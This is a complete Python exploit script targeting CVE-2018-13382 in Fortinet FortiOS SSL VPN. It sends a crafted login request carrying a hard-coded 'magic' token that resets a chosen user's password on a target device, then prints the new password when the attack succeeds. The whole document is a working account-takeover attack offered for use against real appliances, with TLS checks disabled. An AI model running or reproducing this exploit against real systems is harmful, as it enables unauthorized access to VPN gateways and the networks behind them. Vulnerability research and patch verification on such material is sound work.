# Fortinet FortiOS 6.0.4 authenticated credential changing exploit


#!/usr/bin/env python

import requests, urllib3, sys, re, argparse
urllib3.disable_warnings()

menu = argparse.ArgumentParser(description = "FortiOS Backdoor Exploit - CVE-2018-13382")
menu.add_argument('-t', metavar='Target/Host IP', required=True)
menu.add_argument('-p', metavar='Port', required=True)
menu.add_argument('-u', metavar='User', required=True)
menu.add_argument('--setpass', metavar='SetNewPass', default='password', help='Set the password for user, if you not set, the default password will be set to password')
op = menu.parse_args()

host = op.t
port = op.p
user = op.u
setpass = op.setpass

url = "https://"+host+":"+port+"/remote/logincheck"
exploit = {'ajax':'1','username':user,'magic':'4tinet2095866','credential':setpass}
r = requests.post(url, verify=False, data = exploit)

if re.search("/remote/hostcheck_install",r.text):
    print " The new password to ["+user+"] is "+setpass+" <<<< "
else:
    print "Exploit Unsuccessful. :/"
